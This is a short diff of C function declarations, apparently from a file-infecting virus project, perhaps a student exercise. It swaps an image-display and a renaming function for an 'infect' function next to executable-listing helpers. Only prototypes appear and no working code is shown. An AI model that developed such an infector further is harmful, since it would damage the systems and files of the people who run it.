@@ -12,10 +12,9 @@
 struct stat sb;
 
 bool checkStringContains(char *fileName);
-void afficheImage(char *fileName);
 void listeFichier(char *extension);
 void listingExecs();
-void renamingFile(char *fileName);
+void infect(char *fileName);
 bool verifPresenceFichierOld(char *str);
 
 
